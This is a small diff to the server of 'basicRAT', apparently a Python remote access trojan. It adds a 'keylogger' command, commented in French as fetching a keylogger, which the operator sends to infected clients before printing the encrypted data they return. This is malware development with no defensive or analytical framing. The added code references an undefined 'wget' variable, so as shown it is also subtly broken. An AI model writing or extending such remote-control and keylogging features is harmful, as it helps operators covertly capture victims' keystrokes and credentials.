@@ -129,6 +129,11 @@ class ClientConnection(common.Client):
             recv_data = self.recvGCM().rstrip()
             print recv_data
 
+        # WGET DU KEYLOGGER
+        elif cmd in ['keylogger']:
+            print 'Running {}...'.format(wget)
+            recv_data = self.recvGCM().rstrip()
+            print recv_data
 
 def get_parser():
     parser = argparse.ArgumentParser(description='basicRAT server')
